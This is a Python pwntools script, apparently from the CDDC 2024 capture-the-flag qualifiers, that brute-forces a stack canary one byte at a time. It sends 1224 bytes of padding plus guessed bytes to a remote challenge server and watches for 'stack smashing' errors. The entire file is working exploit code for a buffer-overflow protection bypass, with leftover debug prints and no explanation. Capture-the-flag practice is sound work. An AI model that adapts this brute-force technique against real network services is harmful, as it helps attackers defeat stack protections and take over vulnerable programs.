from pwn import *

# context.log_level='debug'

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            message = base + str(guess)
            print(message, "MESSAGE")
            input()
            io = remote("cddc2024-qualifiers-nlb-231aa6753cb7a1e6.elb.ap-southeast-1.amazonaws.com", 10914)

            io.recvuntil(b"input> ")
            io.sendline(message.encode('utf-8'))
            print(io.recv(), "HLLO2")
            result = io.recv()

            if b'stack smashing' not in result.lower():
                print("Guessed correct byte:", format(guess, '02x'))
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                io.close()
                break
            else:
                guess += 1
                io.close()

    print("FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary))
    return base
    
canary_offset = 1224
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_canary[len(base_canary)-8:])
print(base_canary)